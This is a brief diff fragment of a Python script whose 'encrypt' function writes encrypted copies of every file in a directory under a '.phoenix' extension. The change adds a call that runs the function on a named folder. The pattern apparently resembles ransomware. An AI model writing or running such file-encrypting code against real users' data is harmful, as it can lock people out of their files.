@@ -21,3 +21,7 @@ def encrypt(directory):
 
             with open(os.path.join(root, file) + '.phoenix', 'wb') as f:
                 f.write(encrypted_data)
+                
+
+
+encrypt("codewithalouh/")
